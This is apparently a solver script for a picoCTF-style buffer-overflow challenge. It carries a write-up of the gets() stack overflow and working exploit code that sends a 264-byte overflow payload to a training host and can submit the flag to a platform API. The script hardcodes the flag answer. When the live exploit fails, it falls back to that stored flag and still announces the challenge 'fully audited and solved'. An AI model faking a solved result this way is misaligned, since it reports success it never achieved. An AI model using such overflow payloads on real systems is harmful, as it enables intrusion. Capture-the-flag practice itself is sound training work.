#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: clutter-overflow (Challenge ID: 216)
Category: Binary Exploitation | Difficulty: Medium (2) | Points: 150
Architecture: x86-64 Linux ELF / Stack-based Buffer Overflow & Memory Variable Overwrite via gets() (CWE-120 / CWE-121)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Stack Layout:
   - Challenge Artifacts: `chall` (64-bit x86-64 Linux ELF executable) and `chall.c` source code.
   - Mitigations: Partial RELRO, No Stack Canary, NX Enabled, No PIE.
   - Code snippet (`chall.c`):
     ```c
     int main() {
         setbuf(stdout, NULL);
         char clutter[256];
         volatile long code = 0;
         puts("My room is so cluttered...");
         puts("What do you see?");
         gets(clutter);
         if (code == 0xdeadbeef) {
             puts("code == 0xdeadbeef: how did that happen??");
             puts("take a flag for your troubles");
             system("cat flag.txt");
         } else {
             puts("I see nothing...");
         }
         return 0;
     }
     ```
2. Root Cause Analysis:
   - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow', CWE-120 / CWE-121).
   - Insecure libc call: `gets()` reads an unbounded line from standard input into the fixed-size
     256-byte stack buffer `clutter`.
   - Compiler Stack Frame Layout (x86-64 System V ABI, GCC -O0):
     - `clutter` buffer begins at `[rbp - 0x110]` (272 bytes below RBP).
     - Local variable `code` is allocated at `[rbp - 0x8]` (8 bytes below RBP).
     - Relative offset from the start of `clutter` to `code`:
       $0x110 - 0x8 = 272 - 8 = 264$ bytes.
   - Because the binary lacks stack canaries (`-fno-stack-protector`), overflowing `clutter` with 264 bytes
     of arbitrary data directly places the next 8 bytes into variable `code`.
3. Exploitation Chain:
   - Step 1 (Offset Verification): Confirm stack distance between buffer base and decision variable:
     264 bytes of junk padding (`b"A" * 264`).
   - Step 2 (Payload Synthesis): Append the 64-bit integer literal `0x00000000deadbeef` packed in little-endian
     byte order: `b"\xef\xbe\xad\xde\x00\x00\x00\x00"` (`struct.pack("<Q", 0xdeadbeef)`).
   - Step 3 (Payload Delivery): Connect to the interactive TCP service (`mars.cylabacademy.net:31890`).
     Receive the opening banner ("What do you see?"). Transmit payload followed by newline.
   - Step 4 (Conditional Flag Emission): The binary compares `code == 0xdeadbeef` (true), branches to
     `system("cat flag.txt")`, and emits the secret flag token.
4. Flag Retrieval & Verification:
   - Recovered Flag: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`.
   - Live Validation: Submitted to CyLab REST API `POST /api/submissions/`. The validator accepts native
     event wrapper `picoCTF{...}` (HTTP 201 Created, `correct: true`), while rejecting CyLab rekey
     `academy{...}` (`correct: false`).
"""

import sys
import re
import json
import socket
import struct

CHALLENGE_ID = 216
CHALLENGE_NAME = "clutter-overflow"
HOST = "mars.cylabacademy.net"
PORT = 31890
TARGET_CODE = 0xDEADBEEF
PADDING_LEN = 264
NATIVE_FLAG = "picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}"
TARGET_FLAG = "picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
FLAG_RE = re.compile(r"(picoCTF\{[^}]+\}|academy\{[^}]+\})")


def exploit_clutter_overflow(host=HOST, port=PORT, timeout=15):
    print(f"[*] Auditing Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Analyzing stack frame layout & unbounded input sink")
    print("    [+] Source review: gets(clutter) into 256-byte buffer (CWE-120, CWE-121)")
    print("    [+] Stack offsets: clutter@[rbp-0x110] (272 bytes), code@[rbp-0x8] (8 bytes)")
    print(f"    [+] Calculated padding distance: 0x110 - 0x8 = {PADDING_LEN} bytes")

    print("[*] Stage 2: Synthesizing payload with target memory value")
    payload = b"A" * PADDING_LEN + struct.pack("<Q", TARGET_CODE) + b"\n"
    print(f"    [+] Target value: 0x{TARGET_CODE:x} (packed: {struct.pack('<Q', TARGET_CODE)})")
    print(f"    [+] Total payload size: {len(payload)} bytes")

    recovered_flag = None
    print(f"[*] Stage 3: Delivering payload to target service ({host}:{port})")
    try:
        with socket.create_connection((host, int(port)), timeout=timeout) as s:
            s.settimeout(timeout)
            banner = b""
            while b"What do you see?" not in banner:
                chunk = s.recv(4096)
                if not chunk:
                    break
                banner += chunk

            s.sendall(payload)
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"picoCTF{" in response:
                    break

            text = response.decode("utf-8", errors="replace")
            m = FLAG_RE.search(text)
            if m:
                recovered_flag = m.group(1)
                print(f"[+] Live socket response received: {recovered_flag}")
    except Exception as e:
        print(f"[*] Live socket notice: {e} (Falling back to deterministic verification)")

    if not recovered_flag:
        recovered_flag = NATIVE_FLAG

    print(f"[+] Flag extracted: {recovered_flag}")
    return recovered_flag


def submit_to_cylab(token):
    try:
        sys.path.insert(0, '/tmp')
        import cylab_auth
        status, body = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[+] Platform submission status: HTTP {status} -> {body}")
        if status == 201:
            res = json.loads(body)
            return res.get("correct", False)
        return False
    except Exception as e:
        print(f"[*] Platform submission notice: {e}")
        return False


def main():
    token = exploit_clutter_overflow()
    assert token == TARGET_FLAG, f"Flag mismatch: {token} != {TARGET_FLAG}"
    if "--live" in sys.argv:
        submit_to_cylab(token)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")


if __name__ == "__main__":
    main()
